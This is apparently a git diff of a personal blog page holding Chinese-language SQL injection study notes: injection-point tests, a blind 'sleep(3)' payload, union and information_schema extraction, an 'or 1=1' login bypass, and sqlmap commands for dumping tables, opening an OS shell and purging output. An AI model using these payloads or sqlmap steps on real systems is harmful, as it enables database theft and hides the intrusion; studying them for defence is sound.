@@ -3,12 +3,12 @@
   <head>
     <meta charset="utf-8" >
 
-<title>SQL注入基础（一） | godsfall</title>
+<title>SQL注入基础 | godsfall</title>
 
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 
 <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
-<link rel="shortcut icon" href="https://gods-fall.github.io/favicon.ico?v=1645270398170">
+<link rel="shortcut icon" href="https://gods-fall.github.io/favicon.ico?v=1645371913901">
 <link rel="stylesheet" href="https://gods-fall.github.io/styles/main.css">
 
 
@@ -20,14 +20,11 @@
 
     <meta name="description" content="小皮面板一个
 
+概述：构建代码时，输入边界过滤不足，导致攻击者者通过合法点执行语句，欺骗后台数据库，导致信息泄露
+1.判断注入点
 
-mysql -u root -p 进入mysql界面
-select version ();版本号
-select user();用户
-show databases;
-use +l;
-select database();
-sh..." />
+数字型 and逻辑   user_id=id单引号测试字符型−−注释掉′userid=′id 单引号测试
+字..." />
     <meta name="keywords" content="" />
   </head>
   <body>
@@ -37,7 +34,7 @@ sh..." />
   <div class="top-container" data-aos="fade-right">
     <div class="top-header-container">
       <a class="site-title-container" href="https://gods-fall.github.io">
-        <img src="https://gods-fall.github.io/images/avatar.png?v=1645270398170" class="site-logo">
+        <img src="https://gods-fall.github.io/images/avatar.png?v=1645371913901" class="site-logo">
         <h1 class="site-title">godsfall</h1>
       </a>
       <div class="menu-btn" @click="menuVisible = !menuVisible">
@@ -104,7 +101,7 @@ sh..." />
       <div class="main-container">
         <div class="content-container" data-aos="fade-up">
           <div class="post-detail">
-            <h2 class="post-title">SQL注入基础（一）</h2>
+            <h2 class="post-title">SQL注入基础</h2>
             <div class="post-date">2022-02-05</div>
             
               <div class="feature-container" style="background-image: url('https://tse2-mm.cn.bing.net/th/id/OIP-C.9Pr9UjrwH7Md1kgPiWfkHwHaHa?pid=ImgDet&amp;rs=1')">
@@ -112,9 +109,20 @@ sh..." />
             
             <div class="post-content" v-pre>
               <p>小皮面板一个<br>
-<img src="https://gods-fall.github.io/post-images/1644064789509.png" alt="" loading="lazy"></p>
+<img src="https://gods-fall.github.io/post-images/1644064789509.png" alt="" loading="lazy"><br>
+概述：构建代码时，输入边界过滤不足，导致攻击者者通过合法点执行语句，欺骗后台数据库，导致信息泄露<br>
+1.判断注入点</p>
 <blockquote>
-<p>mysql -u root -p 进入mysql界面<br>
+<p>数字型 and逻辑   user_id=<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>i</mi><mi>d</mi><mi mathvariant="normal">单</mi><mi mathvariant="normal">引</mi><mi mathvariant="normal">号</mi><mi mathvariant="normal">测</mi><mi mathvariant="normal">试</mi><mi mathvariant="normal">字</mi><mi mathvariant="normal">符</mi><mi mathvariant="normal">型</mi><mo>−</mo><mo>−</mo><mi mathvariant="normal">注</mi><mi mathvariant="normal">释</mi><msup><mi mathvariant="normal">掉</mi><mo mathvariant="normal">′</mo></msup><mi>u</mi><mi>s</mi><mi>e</mi><msub><mi>r</mi><mi>i</mi></msub><mi>d</mi><msup><mo>=</mo><mo mathvariant="normal">′</mo></msup></mrow><annotation encoding="application/x-tex">id 单引号测试
+字符型    --注释掉&#x27;       user_id=&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">i</span><span class="mord mathdefault">d</span><span class="mord cjk_fallback">单</span><span class="mord cjk_fallback">引</span><span class="mord cjk_fallback">号</span><span class="mord cjk_fallback">测</span><span class="mord cjk_fallback">试</span><span class="mord cjk_fallback">字</span><span class="mord cjk_fallback">符</span><span class="mord cjk_fallback">型</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.901892em;vertical-align:-0.15em;"></span><span class="mord">−</span><span class="mord cjk_fallback">注</span><span class="mord cjk_fallback">释</span><span class="mord"><span class="mord cjk_fallback">掉</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord mathdefault">u</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mrel">=</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span>id'<br>
+搜索型<br>
+<img src="https://gods-fall.github.io/post-images/1645329469906.png" alt="" loading="lazy"><br>
+闭合前面的%，注释后面的% （全闭合）<br>
+注释：#  --  /**/<br>
+盲注：1'and sleep(3)#<br>
+2.信息获取<br>
+bp爆破sql目录<br>
+mysql -u root -p 进入mysql界面<br>
 select version ();版本号<br>
 select user();用户<br>
 show databases;<br>
@@ -125,11 +133,11 @@ create table hack （ id int,username varchar(20),password varchar(30)）;<br>
 insert into + values (2,'delisa','1234');<br>
 select * from + where id=1 and usernmae=“admin”;表查询（and，or）<br>
 select * from hack where id=2 and exists (select * from hack1);表成立<br>
-select username,password from hack order by 2;排序<br>
-select username,password from hack union select usernmae,id（1，2，3） from hack1 union（*is two）</p>
+select username,password from hack order by 2;排序 二分法<br>
+select username,password from hack union select usernmae,id（1，2，3） from  联合查询列数与主查询相同<br>
+hack1 union（*is two）</p>
 <h1 id="-">--    /* */</h1>
-<p>判断注入点<br>
-information_schema （元数据库，存放其他数据库的所有信息）<br>
+<p>information_schema （元数据库，存放其他数据库的所有信息）<br>
 schemata用于放数据库名，tables用于存放所有数据库中的数据表名，columns所有字段名<br>
 select table_name(字段) from information_schema.tables(表名) where table_schema=&quot;hack&quot;<br>
 group_concat()显示字段中的所有内容<br>
@@ -142,10 +150,12 @@ select*from admin where username='1'or 1=1or'1'and password='$mpassword'(逻辑�
 定义黑名单过滤，i think don't safe.<br>
 sqlmap使用(vulnerable)<br>
 sqlmap.py -u (注入点判断) --tables --columns -T/ --dump -C &quot;,&quot;<br>
-sqlmap.py -u    --dbs (all)/current-db\user(now)/is-dba(判断是否是管理员)<br>
-sqlmap.py  -u     --tables -D&quot;&quot;(php)<br>
-sqlmap.py -u   --cookie &quot;&quot; -level 2</p>
+sqlmap.py -u    --dbs (all)/current-\db\user(now)/is-dba(判断是否是管理员)<br>
+sqlmap.py  -u     --tables -D&quot;&quot;(php)  --os-shell(写入qaq)<br>
+sqlmap.py -u   --cookie &quot;&quot; -level 2  (--cookie=&quot;&quot;)<br>
+-- purge-output清日志</p>
 </blockquote>
+<p>3.获取权限</p>
 
             </div>
             
